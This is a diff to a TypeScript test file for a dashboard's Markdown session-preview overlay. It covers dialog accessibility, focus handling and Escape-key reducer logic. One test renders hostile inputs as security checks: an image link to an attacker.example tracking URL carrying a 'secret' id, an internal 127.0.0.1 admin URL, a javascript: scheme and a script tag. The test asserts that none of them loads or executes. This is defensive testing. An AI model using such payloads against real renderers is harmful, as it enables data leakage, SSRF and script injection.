@@ -15,8 +15,11 @@ import {
   sessionExchangePreview,
   sessionTopicKey,
   shouldOpenWritableTerminal,
+  previewOverlayReducer,
+  previewOverlayInitialState,
 } from '../src/dashboard/web/sessions.js';
 import { CliFilterGroup, TopicGroupsView } from '../src/dashboard/web/sessions-page.js';
+import { previewMarkdownHtml } from '../src/dashboard/web/preview-markdown.js';
 
 const kanbanCallbacks: SessionsKanbanCallbacks = {
   canRestartSession: row => row.status !== 'closed',
@@ -164,7 +167,9 @@ describe('dashboard sessions filters', () => {
     expect(page).toContain("t('sessions.history.user')");
     expect(page).toContain("t('sessions.history.bot')");
     expect(page).toContain('className="session-card-exchange-tooltip"');
-    expect(page).toContain('role="tooltip"');
+    // Overlay carries interactive Markdown links, so it is a non-modal dialog
+    // (not a tooltip): keyboard-focusable and reachable.
+    expect(page).toContain('role="dialog"');
     expect(page).toContain("t('sessions.preview.showFull')");
     expect(page).toContain('aria-expanded={open}');
     expect(page).toContain('onPointerEnter={event => {');
@@ -204,6 +209,73 @@ describe('dashboard sessions filters', () => {
 
     // Overlay Markdown body is styled with dashboard tokens (no new palette).
     expect(css).toContain('.session-card-exchange-md');
+  });
+
+  it('never emits an auto-loading <img> for Markdown image syntax (SSRF / tracking-pixel safe)', () => {
+    // `html:false` does NOT cover Markdown image tokens — they still emit
+    // <img src=…>, which the auto-opening overlay would fetch on hover/focus,
+    // leaking to an external tracker or hitting an internal URL (SSRF). The
+    // image rule must degrade to a non-fetching text placeholder. Verified by
+    // ACTUALLY RENDERING, not by scanning source for `html:false`.
+    const external = previewMarkdownHtml('![track](https://attacker.example/pixel?id=secret)');
+    const internal = previewMarkdownHtml('![lan](http://127.0.0.1:8080/admin)');
+    const jsScheme = previewMarkdownHtml('![x](javascript:alert(1))');
+    for (const html of [external, internal, jsScheme]) {
+      expect(html).not.toMatch(/<img\b/i);
+    }
+    // Alt text is preserved; a safe-scheme src becomes an opt-in click-through
+    // link (never auto-loaded), an unsafe scheme stays inert text.
+    expect(external).toContain('session-card-exchange-img');
+    expect(external).toContain('track');
+    expect(external).toContain('href="https://attacker.example/pixel?id=secret"');
+    expect(jsScheme).not.toContain('href="javascript:');
+    // Ordinary Markdown still renders.
+    expect(previewMarkdownHtml('**bold**')).toContain('<strong>bold</strong>');
+    // Raw HTML / script stays escaped.
+    expect(previewMarkdownHtml('<script>alert(1)</script>')).not.toMatch(/<script/i);
+  });
+
+  it('keeps the overlay open and reachable for keyboard focus into Markdown links', () => {
+    const page = readFileSync(new URL('../src/dashboard/web/sessions-page.tsx', import.meta.url), 'utf8');
+
+    // Focus entering the panel cancels the trigger's blur-close timer, so
+    // Tabbing into a rendered link does not unmount the overlay mid-navigation.
+    expect(page).toContain('onFocusCapture={clearHide}');
+    // It only closes once focus leaves BOTH the panel and the trigger.
+    expect(page).toContain('tooltipRef.current?.contains(next) || triggerRef.current?.contains(next)');
+    // Escape closes and returns focus to the trigger.
+    expect(page).toContain('triggerRef.current?.focus()');
+    // Popover semantics on the trigger (not aria-describedby on a tooltip).
+    expect(page).toContain('aria-haspopup="dialog"');
+    expect(page).toContain('aria-controls={open ? tooltipId : undefined}');
+  });
+
+  it('Escape then refocus does not reopen the overlay (reducer the component actually uses)', () => {
+    const page = readFileSync(new URL('../src/dashboard/web/sessions-page.tsx', import.meta.url), 'utf8');
+
+    // Guard against "test the model, run other code": assert the component wires
+    // its useReducer to THIS reducer + dispatches the transitions under test.
+    expect(page).toContain('useReducer(previewOverlayReducer, previewOverlayInitialState)');
+    expect(page).toContain("dispatch('escape-refocus')");
+    expect(page).toContain("dispatch('focus')");
+
+    // Now EXECUTE the transitions in the exact order the Escape key produces:
+    // an open overlay with focus inside → 'escape-refocus' (close + arm one-shot)
+    // → the trigger's programmatic refocus dispatches 'focus'. The one-shot must
+    // be consumed WITHOUT reopening, so the terminal state is closed.
+    let state = previewOverlayInitialState;
+    state = previewOverlayReducer(state, 'open');
+    expect(state.open).toBe(true);
+    state = previewOverlayReducer(state, 'escape-refocus');
+    expect(state).toEqual({ open: false, suppressFocusOpen: true });
+    state = previewOverlayReducer(state, 'focus');
+    expect(state).toEqual({ open: false, suppressFocusOpen: false });
+
+    // A normal (non-suppressed) focus opens; suppress is one-shot only.
+    expect(previewOverlayReducer(previewOverlayInitialState, 'focus'))
+      .toEqual({ open: true, suppressFocusOpen: false });
+    // A second focus after the consumed one-shot opens as usual.
+    expect(previewOverlayReducer({ open: false, suppressFocusOpen: false }, 'focus').open).toBe(true);
   });
 
   it('drops the ••• details button and makes the preview body itself the toggle', () => {
